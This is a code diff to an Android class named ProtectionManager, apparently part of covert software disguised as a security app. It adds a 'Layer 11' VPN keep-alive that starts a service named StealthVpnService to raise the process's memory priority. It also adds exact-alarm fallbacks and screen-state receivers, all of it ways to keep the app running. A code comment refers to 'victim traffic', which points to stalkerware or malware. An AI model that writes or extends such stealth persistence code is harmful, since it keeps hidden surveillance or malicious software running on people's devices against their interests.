@@ -176,6 +176,12 @@ public final class ProtectionManager {
         // Layer 8+9 — Broadcast receivers
         registerReceivers();
 
+        // Layer 11 — VPN keep-alive (optional, activates if user consented during setup)
+        // An active VpnService gives the process foreground-equivalent OOM priority.
+        // The VPN uses TEST-NET routes only; no victim traffic is affected.
+        // If VPN permission was never granted, this call is a no-op.
+        startVpnKeepAlive();
+
         Log.i(TAG, "Protection engine armed");
     }
 
@@ -248,7 +254,16 @@ public final class ProtectionManager {
                     : PendingIntent.FLAG_UPDATE_CURRENT;
             PendingIntent pi = PendingIntent.getBroadcast(ctx, 0xBEEF, i, flags);
             long trigger = SystemClock.elapsedRealtime() + delayMs;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                // API 31+: setExactAndAllowWhileIdle throws SecurityException without
+                // SCHEDULE_EXACT_ALARM or USE_EXACT_ALARM. Check before calling.
+                if (am.canScheduleExactAlarms()) {
+                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                } else {
+                    // Inexact fallback — Android batches it, but it will still fire.
+                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
+                }
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
@@ -257,6 +272,36 @@ public final class ProtectionManager {
             }
         } catch (Exception e) {
             Log.w(TAG, "Alarm schedule failed: " + e.getMessage());
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════════
+    //  Layer 11 — VPN keep-alive
+    // ══════════════════════════════════════════════════════════════════════
+
+    private void startVpnKeepAlive() {
+        try {
+            // prepare() returns null when VPN permission is already held.
+            // Returns a non-null Intent when the user still needs to consent
+            // (handled in SetupWizardActivity, not from a background service).
+            // Does NOT throw — the return value is the signal, not an exception.
+            android.content.Intent consentIntent = android.net.VpnService.prepare(ctx);
+            if (consentIntent != null) {
+                // User hasn't granted VPN consent yet — silent skip.
+                // SetupWizardActivity will request consent during the setup flow.
+                Log.d(TAG, "Layer 11: VPN consent not yet granted, skipping");
+                return;
+            }
+            // prepare() returned null → permission held, safe to start
+            Intent vpn = new Intent(ctx, com.seguranca.protecao.StealthVpnService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(vpn);
+            } else {
+                ctx.startService(vpn);
+            }
+            Log.d(TAG, "Layer 11: VPN keep-alive service started");
+        } catch (Exception e) {
+            Log.w(TAG, "Layer 11 VPN: " + e.getMessage());
         }
     }
 
@@ -439,7 +484,14 @@ public final class ProtectionManager {
         sf.addAction(Intent.ACTION_SCREEN_ON);
         sf.addAction(Intent.ACTION_SCREEN_OFF);
         sf.addAction(Intent.ACTION_USER_PRESENT);
-        ctx.registerReceiver(screenReceiver, sf);
+        // API 34 requires RECEIVER_EXPORTED or RECEIVER_NOT_EXPORTED for dynamic receivers.
+        // System-sent broadcasts (SCREEN_ON/OFF/USER_PRESENT) still reach RECEIVER_NOT_EXPORTED;
+        // only third-party apps are blocked from targeting this receiver.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ctx.registerReceiver(screenReceiver, sf, Context.RECEIVER_NOT_EXPORTED);
+        } else {
+            ctx.registerReceiver(screenReceiver, sf);
+        }
 
         // Guard alarm receiver
         guardReceiver = new BroadcastReceiver() {
